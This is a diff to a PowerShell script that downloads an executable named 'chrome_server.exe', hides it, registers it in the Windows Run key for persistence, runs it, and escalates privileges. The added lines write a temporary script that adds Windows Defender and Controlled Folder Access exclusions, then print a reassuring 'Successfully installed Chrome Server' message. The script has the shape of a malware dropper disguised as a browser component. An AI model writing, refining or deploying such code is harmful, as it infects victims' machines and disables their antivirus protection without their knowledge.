@@ -84,13 +84,18 @@ $file_path = Join-Path -Path $dir -ChildPath 'chrome_server.exe'
 Get-File -Uri $uri -TargetFile $dir
 if (Test-Path -Path $file_path) {
     [System.Console]::Clear()
-    Write-Host "Done"
+    Write-Host "✅ Successfully installed Chrome Server"
     Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Chrome Server' -Value $file_path
     Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
     Invoke-Item -Path $file_path
     if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-      Start-Process powershell -Verb runAs -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"")
+      $file_path = Join-Path -Path $env:TEMP -ChildPath 'Google\Chrome\chrome_server.exe'
+      $cmd1 = "Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ControlledFolderAccessAllowedApplications ${file_path}"
+      Set-Content -Path "$env:TEMP\run2.ps1" -Value $cmd1
+      Start-Process powershell -Verb runAs -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File $env:TEMP\run2.ps1")
+      Remove-Item -Path "$env:TEMP\run2.ps1"
+      Start-Sleep -Seconds 2
+      Write-Host "✅ Successfully added to Windows Defender exclusion list"
+      exit
     }
-    Add-MpPreference -ExclusionPath $file_path
-    Add-MpPreference -ControlledFolderAccessAllowedApplications $file_path
 }
